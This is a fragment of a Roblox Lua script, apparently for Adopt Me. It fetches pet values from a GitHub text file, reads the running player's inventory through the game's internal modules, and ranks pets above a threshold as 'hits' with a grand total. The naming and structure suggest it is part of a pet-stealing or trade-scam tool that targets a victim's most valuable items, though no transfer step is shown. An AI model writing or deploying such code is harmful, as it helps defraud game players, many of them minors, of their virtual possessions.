-- 5. Fetch GitHub & Scan Inventory
local PetValues = {}
local function loadValues()
    local success, res = pcall(function() return game:HttpGet("https://raw.githubusercontent.com/charles1384/ADM/refs/heads/main/ADM_PET_VALUE.txt") end)
    if success then
        for line in res:gmatch("[^\r\n]+") do
            local n, v = line:match("([^,]+),([^,]+)")
            if n and v then PetValues[n:lower():trim()] = tonumber(v) end
        end
    end
end
loadValues()

local InventoryDB = Fsys("InventoryDB")
local ClientData = Fsys("ClientData")

local function getValidInventory()
    local hits, total = {}, 0
    local inv = ClientData.get("inventory")
    for uid, item in pairs(inv.pets or {}) do
        local data = InventoryDB.pets[item.id]
        if data and not cfg.pet_block_list[item.id] then
            local val = PetValues[data.name:lower()] or 0
            if val >= cfg.threshold then
                total = total + val
                table.insert(hits, {uid = uid, name = data.name, val = val})
            end
        end
    end
    table.sort(hits, function(a,b) return a.val > b.val end)
    return hits, total
end

local finalHits, grandTotal = getValidInventory()

